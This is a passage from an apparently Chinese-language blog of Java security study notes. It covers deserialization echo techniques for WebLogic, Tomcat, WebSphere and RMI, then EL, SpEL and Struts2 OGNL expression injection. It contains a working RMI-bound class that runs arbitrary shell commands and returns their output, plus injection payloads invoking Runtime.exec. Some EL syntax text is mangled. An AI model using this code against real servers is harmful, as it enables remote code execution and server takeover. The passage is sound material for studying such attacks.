class="hljs-title class_">ReflectionExtractor</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;main&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String[].class&#125;&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionExtractor</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;&#125;),<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="2-直接调用defineClass"><a href="#2-直接调用defineClass" class="headerlink" title="2.直接调用defineClass"></a><strong>2.直接调用defineClass</strong></h5><h6 id="1-CVE-2020-14644-回显实现"><a href="#1-CVE-2020-14644-回显实现" class="headerlink" title="(1) CVE-2020-14644 回显实现"></a><strong>(1) CVE-2020-14644 回显实现</strong></h6><p><strong>1.漏洞原理分析</strong></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg5OTQ3NzA2MQ==&mid=2247483673&idx=1&sn=3e1d746e33529651acd418a097d962f1&scene=21#wechat_redirect">Weblogic CVE-2020-14644 分析</a></p><p>大致可以认为，是可以执行我们自定义类中statice代买块中的java代码，也就是，执行任意Java代码。</p><p><strong>2.回显实现</strong></p><p>其实也是借用rmi实现的回显，但是更方便了，我们不用再借用CC或者coherence将整个rmi回显过程串联起来了(也就是省去了defineClass获取以及反射调用main绑定的步骤)，直接将我们的回显逻辑写到static代码块中，目标服务器直接执行即可。</p><p>直接看我们要执行的staic代码 <a href="https://github.com/potats0/cve_2020_14644">https://github.com/potats0/cve_2020_14644</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Remotable</span>, ClusterMasterRemote &#123;<br><br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">bindName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UnicodeSec&quot;</span>;<br>            <span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>            <span class="hljs-type">test</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">test</span>();<br>            ctx.rebind(bindName, remote);<br>            System.out.println(<span class="hljs-string">&quot;installed&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var1) &#123;<br>            var1.printStackTrace();<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br><br><br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> RemoteConstructor <span class="hljs-title function_">getRemoteConstructor</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRemoteConstructor</span><span class="hljs-params">(RemoteConstructor remoteConstructor)</span> &#123;<br><br><br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setServerLocation</span><span class="hljs-params">(String var1, String var2)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><br><br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServerLocation</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><br><br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>            <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                isLinux = <span class="hljs-literal">false</span>;<br>            &#125;<br>            List&lt;String&gt; cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();<br><br><br>            <span class="hljs-keyword">if</span> (isLinux) &#123;<br>                cmds.add(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>                cmds.add(<span class="hljs-string">&quot;-c&quot;</span>);<br>                cmds.add(cmd);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                cmds.add(<span class="hljs-string">&quot;cmd.exe&quot;</span>);<br>                cmds.add(<span class="hljs-string">&quot;/c&quot;</span>);<br>                cmds.add(cmd);<br>            &#125;<br><br><br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmds);<br>            processBuilder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">proc</span> <span class="hljs-operator">=</span> processBuilder.start();<br><br><br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(proc.getInputStream()));<br>            <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br><br><br>            String line;<br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                sb.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br><br><br>            <span class="hljs-keyword">return</span> sb.toString();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> e.getMessage();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="3-获取resp写入回显结果"><a href="#3-获取resp写入回显结果" class="headerlink" title="3.获取resp写入回显结果"></a><strong>3.获取resp写入回显结果</strong></h5><h6 id="1-Tomcat-通用回显"><a href="#1-Tomcat-通用回显" class="headerlink" title="(1) Tomcat 通用回显"></a><strong>(1) Tomcat 通用回显</strong></h6><p>目的：获取返回包并写入回显内容</p><p>站在巨人肩膀上[2]，实现逻辑如下 ，这里注意下Mbeans的利用(给自己留个坑)</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs leaf">Registry.getRegistry(null, null).getMBeanServer() -&gt;<br><br>JmxMBeanServer.mbsInterceptor -&gt;<br><br>DefaultMBeanServerInterceptor.repository -&gt;<br><br>Registory#query -&gt;<br><br>RequestInfo -&gt;<br><br>Http11Processor<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getRequest</span><span class="hljs-params">()</span></span> -&gt; <br><br>AbstractProcessor<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getRequest</span><span class="hljs-params">()</span></span> -&gt;<br><br>Request<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getResponse</span><span class="hljs-params">()</span></span> -&gt;<br><br>Response<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">doWrite</span><span class="hljs-params">()</span></span> <br></code></pre></td></tr></table></figure><p>具体实现demo 移步 <a href="https://xz.aliyun.com/t/7535#toc-3">https://xz.aliyun.com/t/7535#toc-3</a></p><p>注：回显需要结合在每个gadget中，在反序列化漏洞利用中才能起到真实效果。这里对于gadget的要求最好是可以直接执行java代码，比如CC3 CC4，或者可以间接调用defineClass。当然了，如果漏洞本身就可以直接执行Java代码，那是再方便不过了。</p><h6 id="2-Weblogic-2725-回显"><a href="#2-Weblogic-2725-回显" class="headerlink" title="(2) Weblogic 2725 回显"></a><strong>(2) Weblogic 2725 回显</strong></h6><p><a href="https://github.com/welove88888/CVE-2019-2725">https://github.com/welove88888/CVE-2019-2725</a> 这个项目中使用的回显方式即先获取当前现成，从中获取返回respose，写入回显内容 代码参考 <a href="https://xz.aliyun.com/t/5299#toc-10">https://xz.aliyun.com/t/5299#toc-10</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-type">String</span> <span class="hljs-variable">lfcmd</span> <span class="hljs-operator">=</span> ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(<span class="hljs-string">&quot;lfcmd&quot;</span>);<br>weblogic.servlet.internal.<span class="hljs-type">ServletResponseImpl</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();<br>weblogic.servlet.internal.<span class="hljs-type">ServletOutputStreamImpl</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getServletOutputStream();<br>outputStream.writeStream(<span class="hljs-keyword">new</span> <span class="hljs-title class_">weblogic</span>.xml.util.StringInputStream(lfcmd));<br>outputStream.flush();<br>response.getWriter().write(<span class="hljs-string">&quot;&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> ((weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor)<span class="hljs-built_in">this</span>.getCurrentWork()).getClass().getDeclaredField(<span class="hljs-string">&quot;connectionHandler&quot;</span>);<br>field.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">HttpConnectionHandler</span> <span class="hljs-variable">httpConn</span> <span class="hljs-operator">=</span> (HttpConnectionHandler) field.get(<span class="hljs-built_in">this</span>.getCurrentWork());<br>httpConn.getServletRequest().getResponse().getServletOutputStream().writeStream(<span class="hljs-keyword">new</span> <span class="hljs-title class_">weblogic</span>.xml.util.StringInputStream(<span class="hljs-string">&quot;xxxxxx&quot;</span>));<br></code></pre></td></tr></table></figure><p>结合CVE-2019-2725这个漏洞，需要将上面的类转化为xml格式，weblogic xmldecoder反序列化漏洞，从漏洞角度来说，是支持调用任意类的任意方法，这里直接使用org.mozilla.classfile.DefiningClassLoader的defineClass方法将回显写入类实例化执行。</p><p>其实，这里也可以结合rmi实现回显的方式，毕竟都可以调用defineClass了。</p><h6 id="3-Websphere-回显"><a href="#3-Websphere-回显" class="headerlink" title="(3) Websphere 回显"></a><strong>(3) Websphere 回显</strong></h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-type">Thread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> Thread.currentThread();<br><span class="hljs-type">Field</span> <span class="hljs-variable">wsThreadLocals</span> <span class="hljs-operator">=</span> t.getClass().getDeclaredField(<span class="hljs-string">&quot;wsThreadLocals&quot;</span>);<br>wsThreadLocals.setAccessible(<span class="hljs-literal">true</span>);<br>Object[] obs = (Object[])wsThreadLocals.get(t);<br><span class="hljs-type">WebContainerRequestState</span> <span class="hljs-variable">wr</span> <span class="hljs-operator">=</span> (WebContainerRequestState)obs[<span class="hljs-number">36</span>];<br>wr.getCurrentThreadsIExtendedRequest().getRequestURL();<br></code></pre></td></tr></table></figure><h6 id="4-Spring-Boot-回显"><a href="#4-Spring-Boot-回显" class="headerlink" title="(4) Spring Boot 回显"></a><strong>(4) Spring Boot 回显</strong></h6><p>网上也有结合Spring Boot 进行回显，弱弱说一句，直接可以利用中间件回显，这个就Pass了先。</p><h6 id="4-异常抛出-报错回显"><a href="#4-异常抛出-报错回显" class="headerlink" title="4.异常抛出 报错回显"></a><strong>4.异常抛出 报错回显</strong></h6><h6 id="1-带回显的攻击RMI服务"><a href="#1-带回显的攻击RMI服务" class="headerlink" title="(1) 带回显的攻击RMI服务"></a><strong>(1) 带回显的攻击RMI服务</strong></h6><p>这里我们需要跟一下RMI的流程中客户端的lookup方法</p><p>站在巨人肩膀上(其实就是偷个懒) <a href="https://blog.csdn.net/qsort_/article/details/104861625">https://blog.csdn.net/qsort_/article/details/104861625</a></p><p>在UnicastRef类的newCall方法中与服务端建立Socket连接，并发送一些约定的数据</p><p>通过ref.invoke方法处理服务端响应回来的序列化数据。</p><p>因为在lookup之前执行了getRegisty方法，返回的是RegistryImpl_Stub对象，所以这里的lookup调用的是RegistryImpl_Stub的lookup，我们跟进，已经将关键位置标红<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212056869.png" alt="图片"></p><p><strong>1.首先进入UnicastRef类的newCall方法：</strong><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212100338.png" alt="图片"></p><p> <strong>1.1 首先是获取了一个TCP连接</strong>，可以看到是使用LiveRef去创建的连接，在调试RMIServer时，我们已经知道LiveRef中包含TCPEndpoint属性，其中包含ip与端口等通信信息：<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212100973.png" alt="图片"></p><p><strong>1.2再往下走，看到new了一个StreamRemoteCall</strong>对象，进入StreamRemoteCall的构造方法，其做了如下操作，往服务端发送了一些数据：<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212100774.png" alt="图片"></p><p><strong>2.回到lookup继续往下走</strong>，执行了ObjectOutput.writeObject，这里是将lookup方法中传递的远程服务的名称，即字符串“HelloService”进行了序列化并发往了服务端，然后又执行了super.ref.invoke方法，进入该方法如下，然后继续往下走，</p><p>通过ref.invoke方法处理服务端响应回来的序列化数据。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212101007.png" alt="图片"></p><p><strong>3. lookup往下走，进入StreamRemoteCall类的executeCall方法</strong>，可以猜到该方法就是处理第7步往服务端发送数据后的服务端响应的数据，看到从响应数据中先读取了一个字节，值为81，然后又继续读取一个字节赋值给var1，<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212101337.png" alt="图片"></p><p>下面是判断var1的值，为1直接return，说明没问题，如果为2的话，会先对对象进行反序列化操作，然后判断是否为Exception类型</p><p>&#x3D;&#x3D;网上有关于带回显的攻击RMI服务的exp，它就是将执行完命令后的结果写到异常信息里，然后抛出该异常，这样在客户端就可以看到命令执行的结果了，这时得到的var1的值就是2&#x3D;&#x3D;<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212102828.png" alt="图片"></p><p>当上一步var1值为1时，说明没问题，再回到lookup，会执行ObjectInput.readObject方法将服务端返回的数据反序列化，然后将该对象返回（前面我们也知道了，这里获取到的其实是一个代理对象）。至此，客户端整个请求的过程也梳理完了</p><p><strong>(2) URLClassLoader加载远程恶意类，抛出异常回显</strong></p><p>首先构造恶意类，将执行结果作为异常抛出<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212104177.png" alt="图片"></p><p>但后利用某个反序列化利用链，调用URLClassloader，远程加载恶意类并执行实现回显</p><p>这里是CC5</p><p>图片: <a href="https://uploader.shimo.im/f/ddLgqYsOUDZ6DpyG.png![%E5%9B%BE%E7%89%87](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212104254.png)">https://uploader.shimo.im/f/ddLgqYsOUDZ6DpyG.png![图片](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212104254.png)</a></p><p>By the way  URLClassLoader换成defineClass，利用起来不用出网了就。</p><h6 id="5-写文件"><a href="#5-写文件" class="headerlink" title="5.写文件"></a><strong>5.写文件</strong></h6><p>顾名思义，直接写文件到目标，访问读取，不再赘述</p><p>可以看下面链接的第四个</p><p><a href="https://xz.aliyun.com/t/5257#toc-3">https://xz.aliyun.com/t/5257#toc-3</a></p><h6 id="6-Dnslog"><a href="#6-Dnslog" class="headerlink" title="6.Dnslog"></a><strong>6.Dnslog</strong></h6><p>dnslog方式</p><h3 id="5-1-5-表达式注入"><a href="#5-1-5-表达式注入" class="headerlink" title="5.1.5　表达式注入"></a>5.1.5　表达式注入</h3><p>表达式注入这一概念最早出现在2012年12月的一篇论文Remote Code Executionwith EL Injection Vulnerabilities中，文中详细阐述了表达式注入的成因以及危害。表达式注入在互联网上造成过巨大的危害，例如Struts2系列曾几次因OGNL表达式引起远程代码执行。</p><h4 id="1．EL表达式的基础"><a href="#1．EL表达式的基础" class="headerlink" title="1．EL表达式的基础"></a>1．EL表达式的基础</h4><p>表达式语言（Expression Language），又称EL表达式，是一种在JSP中内置的语言，可以作用于用户访问页面的上下文以及不同作用域的对象，取得对象属性值或者执行简单的运算和判断操作。</p><p>EL表达式的主要功能如下。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">获取数据：EL表达式可以从<span class="hljs-keyword">JSP的四大作用域（page、request、session、application）中获取数据。</span><br><span class="hljs-keyword"></span>执行运算：利用EL表达式可以在<span class="hljs-keyword">JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算。</span><br><span class="hljs-keyword"></span>获取Web开发常用对象：EL表达式内置了<span class="hljs-number">11</span>个隐式对象，开发者可以通过这类隐式对象获得想要的数据。<br>调用<span class="hljs-keyword">Java方法：EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法。</span><br></code></pre></td></tr></table></figure><p>JSP四大作用域如下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">page：只在一个页面保存数据［<span class="hljs-title class_">Javax</span>.<span class="hljs-property">servlet</span>.<span class="hljs-property">jsp</span>.<span class="hljs-property">PageContext</span>（抽象类）］。<br>request：只在一个请求中保存数据（<span class="hljs-title class_">Javax</span>.<span class="hljs-property">servlet</span>.<span class="hljs-property">httpServletRequest</span>）。<br>session：在一次会话中保存数据，仅供单个用户使用（<span class="hljs-title class_">Javax</span>.<span class="hljs-property">servlet</span>. http.<span class="hljs-property">HttpSession</span>）。<br>application：在整个服务器中保存数据，全部用户共享（<span class="hljs-title class_">Javax</span>.<span class="hljs-property">servlet</span>. <span class="hljs-title class_">ServletContext</span>）。<br></code></pre></td></tr></table></figure><p>EL内置11个隐式对象如表5-2所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211524439.png" alt="image-20220421152455346"></p><p>表5-2　EL内置11个隐式对象</p><h4 id="2．EL基础语法"><a href="#2．EL基础语法" class="headerlink" title="2．EL基础语法"></a>2．EL基础语法</h4><p>在JSP中，用户可以使用${}来表示此处为EL表达式，例如，表达式”${ name }”表示获取“name”变量。当EL表达式未指定作用域范围时，默认在page作用域范围查找，而后依次在request、session、application范围查找，也可以使用作用域范围作为前缀来指定在某个作用域范围中查找。例如，表达式“${requestScope.name}”表示在request作用域范围中获取“name”变量。</p><h4 id="3．获取对象属性"><a href="#3．获取对象属性" class="headerlink" title="3．获取对象属性"></a>3．获取对象属性</h4><p>EL表达式有两种获取对象属性的方式。第一种格式为${对象.属性}，例如：$param.name}表示获取param对象中的name属性。第二种为使用“。当属性名中存在特殊字符或者属性名是一个变量时，则需要使用“[]”符号的方式获取属性，例如：$User和$User。</p><p>param.name}表示获取param对象中的name属性。第二种为使用“]”符号，例如：${param[name</p><p>User“Login-Flag”</p><p>Userdata</p><h4 id="4．表达式使用实例"><a href="#4．表达式使用实例" class="headerlink" title="4．表达式使用实例"></a>4．表达式使用实例</h4><p>在实例中，我们可以通过param对象来获取用户传入的参数值，每个页面会根据用户的输入显示不同的值，如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211539396.png" alt="image-20220421153909325"></p><p>URL访问index.jsp?name&#x3D;zhhhy，在页面中可以看到程序输出了对应的name值，如图5-8所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211540162.png" alt="image-20220421154028092"></p><p>图5-8　EL表达式的使用实例</p><p>EL表达式也可以实例化Java的内置类，如Runtime.class会执行系统命令。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211542452.png" alt="image-20220421154219938"></p><p>代码执行结果如图5-9所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211543083.png" alt="image-20220421154300987"></p><p>图5-9　EL表达式实例化Java的内置类Runtime执行命令</p><h4 id="5．CVE-2011-2730-Spring标签EL表达式漏洞"><a href="#5．CVE-2011-2730-Spring标签EL表达式漏洞" class="headerlink" title="5．CVE-2011-2730 Spring标签EL表达式漏洞"></a>5．CVE-2011-2730 Spring标签EL表达式漏洞</h4><p>简单来说，EL表达式是Java代码的简化版，用户可以通过可控的输入注入一段EL表达式执行代码。但实际上在不存在递归解析的情况下，用户难以控制EL表达式进行表达式注入。历史上曾出现一个Spring标签EL表达式漏洞（CVE-2011-2730），漏洞成因是Spring的message标签能够解析执行EL表达式，而Web容器也会对EL表达式进行一次解析，两次解析使EL表达式注入得以利用</p><p>Spring表达式语言（SpEL）是一种与EL功能类似的表达式语言，SpEL可以独立于Spring容器使用，但只是被当成简单的表达式语言来使用。在未对用户的输入做严格的检查，以及错误使用Spring表达式语言时，就有可能产生表达式注入漏洞。</p><p>在SpEL中，EvaluationContext是用于评估表达式和解析属性、方法以及字段并帮助执行类型转换的接口。该接口有两种实现，分别为SimpleEvaluationContext和StandardEvaluationContext，在默认情况下使用StandardEvaluationContext对表达式进行评估。</p><p>SimpleEvaluationContext：针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</p><p>StandardEvaluationContext：公开全套SpEL语言功能和配置选项。用户可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</p><p>当使用StandardEvaluationContext进行上下文评估时，由于StandardEvaluation Context权限过大，可以执行Java任意代码。例如利用Runtime.class执行来弹出一个计算器，如图5-10所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211554666.png" alt="image-20220421155403592"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211554045.png" alt="image-20220421155419396"></p><p>图5-10　利用StandardEvaluationContext 接口弹出计算器</p><p>相比于StandardEvaluationContext，SimpleEvaluationContext的权限要小许多，在使用SimpleEvaluationContext进行上下文评估时，无法使用Runtime.class执行任何系统命令。</p><h4 id="6．CVE-2018-1273-Spring-Data-Commons远程代码执行漏洞"><a href="#6．CVE-2018-1273-Spring-Data-Commons远程代码执行漏洞" class="headerlink" title="6．CVE-2018-1273 Spring Data Commons远程代码执行漏洞"></a>6．CVE-2018-1273 Spring Data Commons远程代码执行漏洞</h4><p>2018年出现的Spring Data Commons的远程代码执行漏洞（CVE-2018-1273）中，攻击者可以构造含有恶意代码的SpEL表达式实现远程代码执行，接管服务器权限。</p><p>从官方发布的修复补丁中，可以清晰地看到使用了SimpleEvaluationContext来代替StandardEvaluationContext，修补了该漏洞，补丁代码如图5-11所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211556728.png" alt="image-20220421155625597"></p><p>图5-11　CVE-2018-1273漏洞补丁对比</p><h4 id="7-通用poc"><a href="#7-通用poc" class="headerlink" title="7.通用poc"></a>7.通用poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;pageContext&#125;<br>$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="hljs-string">&quot;&quot;</span>)&#125;<br>$&#123;header&#125;<br>$&#123;applicationScope&#125;<br>$&#123;pageContext.setAttribute(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;&quot;</span>.getClass()).invoke(<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&quot;calc.exe&quot;</span>))&#125;<br><br></code></pre></td></tr></table></figure><h4 id="8-Struts2-OGNL"><a href="#8-Struts2-OGNL" class="headerlink" title="8.Struts2 OGNL"></a>8.Struts2 OGNL</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">@[类全名（包括包路径）]@[方法名 |  值名]，例如：<br><span class="hljs-meta">@java</span>.lang.String<span class="hljs-meta">@format(&#x27;foo %s&#x27;, &#x27;bar&#x27;)</span><br><br></code></pre></td></tr></table></figure><p>实例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ActionContext</span> <span class="hljs-variable">AC</span> <span class="hljs-operator">=</span> ActionContext.getContext();<br><span class="hljs-type">String</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$&#123;(new java.lang.ProcessBuilder(&#x27;calc&#x27;)).start()&#125;&quot;</span>;<br>AC.getValueStack().findValue(expression));<br></code></pre></td></tr></table></figure><h4 id="9-Spring-SPEL"><a href="#9-Spring-SPEL" class="headerlink" title="9.Spring SPEL"></a>9.Spring SPEL</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> <span 